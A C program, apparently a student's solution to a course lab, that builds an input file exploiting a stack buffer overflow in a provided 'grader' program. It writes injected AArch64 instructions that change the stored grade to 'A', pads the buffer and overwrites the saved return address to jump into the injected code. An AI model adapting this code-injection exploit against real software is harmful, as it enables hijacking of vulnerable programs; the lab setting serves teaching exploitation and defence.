/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Produces a file called dataA with the student name, a nullbyte,    */
/* instructions to change grade to 'A' then branch to the printf call */
/* directly after grade = 'B' in grader, then padding to overrun the  */
/* stack, and the address of the first instruction in BSS, which will */
/* overwrite getName's stored x30.                                    */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Accepts no inputs. Creates a file called dataA and writes data to
   that file that will lead to an A attack. Returns 0. */
int main() {
    size_t ulIndex; /* index for the loop */
    FILE *psFile; /* file */
    unsigned long ulAddrInMain = 0x40089c; /* address of grade printf */
    unsigned long ulAddrInBSS = 0x42005c; /* address of code in BSS */
    unsigned long ulAddrOfAdr = 0x420060; /* address of adr instr */
    unsigned long ulAddrOfB = 0x420068; /* address of b instr */
    unsigned long ulAddrOfGrade = 0x420044; /* address of grade */
    unsigned int uiInstr; /* stores each instruction getting added */
    
    /* create and open file dataB */
    psFile = fopen("dataA", "w");

    /* put names into file */
    fprintf(psFile, "%c", 'N');
    fprintf(psFile, "%c", '&');
    fprintf(psFile, "%c", 'T');
    fprintf(psFile, "%c", '\0'); /* terminating null byte */

    /* put mov instruction */
    uiInstr = MiniAssembler_mov(0, 'A');
    /* fprintf(psFile, "%i", uiInstr); */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put adr instruction */
    uiInstr = MiniAssembler_adr(1, ulAddrOfGrade, ulAddrOfAdr);
    /* fprintf(psFile, "%i", uiInstr); */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put strb instruction */
    uiInstr = MiniAssembler_strb(0, 1);
    /* fprintf(psFile, "%i", uiInstr); */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put b instruction */
    uiInstr = MiniAssembler_b(ulAddrInMain, ulAddrOfB);
    /* fprintf(psFile, "%i", uiInstr); */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* fill remaining buffer */
    for (ulIndex = 0; ulIndex < (48 - 20); ulIndex++) {
        fprintf(psFile, "%c", '\0');
    }

    /* change x30 */
    fwrite(&ulAddrInBSS, sizeof(ulAddrInBSS), 1, psFile);
    return 0;
}
